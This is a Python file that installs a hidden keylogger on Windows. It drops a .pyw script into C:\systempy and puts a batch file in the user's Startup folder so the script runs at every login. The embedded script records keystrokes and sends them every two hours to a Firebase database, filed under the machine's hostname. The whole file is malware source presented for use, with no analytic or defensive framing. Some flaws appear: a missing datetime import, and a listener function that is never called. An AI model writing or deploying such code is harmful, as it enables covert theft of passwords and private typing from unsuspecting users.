import os
import subprocess
import shutil
import sys

pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
python_file_name = "new_key.pyw"  # Python file name, can be changed dynamically
batch_file_name = "new_start.bat"  # Custom batch file name, can be changed dynamically

startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
systempy_folder = "C:\\systempy"
python_script_dest = os.path.join(systempy_folder, python_file_name)
batch_file_path = os.path.join(startup_folder, batch_file_name)

if not os.path.exists(systempy_folder):
    os.makedirs(systempy_folder)

python_code = '''from pynput.keyboard import Key, Listener
import os, time, requests, socket, sys, subprocess
firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")
recent_keys = {}
debounce_time = 0.2
def write_to_file(key):
    current_time = time.time()
    key_str = None
    if hasattr(key, 'char') and key.char: key_str = key.char
    elif key == Key.space: key_str = " "
    elif key == Key.enter: key_str = "\\n"
    elif key == Key.backspace: key_str = "[BS]"
    if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
        with open(log_file, "a") as file: file.write(key_str)
        recent_keys[key_str] = current_time
def upload_to_firebase():
    hostname = socket.gethostname()
    localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(log_file, 'r') as file:
            data = {'runnner': file.read()}
        while True:
            try:
                response = requests.put(f'{firebase_url}users/{hostname}/{localtime}.json', json=data)
                if response.status_code == 200: break
                time.sleep(10)
            except requests.exceptions.RequestException:
                time.sleep(10)
    except FileNotFoundError: pass
def ensure_script_running():
    while True:
        try:
            with Listener(on_press=write_to_file) as listener: listener.join()
        except Exception: time.sleep(10)
def run_in_background():
    if len(sys.argv) == 1:
        script_path = os.path.abspath(__file__)
        subprocess.Popen([sys.executable, script_path, 'background'], close_fds=True)
if __name__ == '__main__':
    run_in_background()
    upload_to_firebase()
    while True:
        time.sleep(7200)
        upload_to_firebase()'''

# Write the Python code to the key.pyw file in the systempy folder
with open(python_script_dest, "w") as file:
    file.write(python_code)

# Define the contents of the custom batch file with dynamically detected pythonw path
batch_file_content = f"""@echo off
pushd %~dp0
"{pythonw_path}" "{python_script_dest}"
exit
"""

# Write the batch file in the Startup folder
with open(batch_file_path, "w") as file:
    file.write(batch_file_content)

# Execute the batch file (optional, to test it immediately)
subprocess.run(batch_file_path, shell=True)

print(f"Batch file created at: {batch_file_path} and Python script saved to: {python_script_dest}")
